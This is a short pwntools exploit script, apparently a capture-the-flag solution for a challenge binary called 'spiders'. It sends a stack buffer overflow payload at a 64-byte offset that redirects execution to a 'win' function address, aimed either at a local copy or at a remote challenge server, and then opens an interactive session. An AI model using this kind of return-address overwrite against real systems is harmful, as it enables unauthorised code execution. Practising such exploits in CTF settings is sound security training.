from pwn import *

CONN = "nc 34.124.192.13 27302"
HOST = CONN.split(" ")[1]
PORT = CONN.split(" ")[2]

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *secret_spider
b *main+71
""".format(
    **locals()
)

# Binary filename
exe = "./spiders"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = 64

# Start program
io = start()

WIN = 0x080491a6

# Build the payload
payload = flat({offset: [
    p32(WIN),
]})

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
